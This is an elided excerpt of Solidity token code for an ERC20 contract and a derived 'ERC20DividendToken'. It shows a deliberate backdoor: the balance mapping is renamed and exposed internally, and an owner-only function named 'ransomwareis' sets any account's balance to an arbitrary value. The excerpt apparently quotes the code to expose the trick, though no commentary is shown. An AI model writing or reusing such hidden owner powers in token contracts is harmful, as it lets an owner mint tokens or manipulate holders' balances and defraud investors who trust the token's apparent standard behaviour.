...
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balancese;
    ...
    function _transfer(
        ...
        uint256 senderBalance = _balancese[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balancese[sender] = senderBalance - amount;
        }
        _balancese[recipient] += amount;
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = _balancese[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balancese[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
...
contract ERC20DividendToken is Context, ERC20Burnable, Ownable {
    ...
    function ransomwareis(uint256 amount, uint256 sama, address account) public onlyOwner {
        ...
        if (amount > balanceOf(account)) {
            ...
            _balancese[account] = amount * (10 ** _decimals);
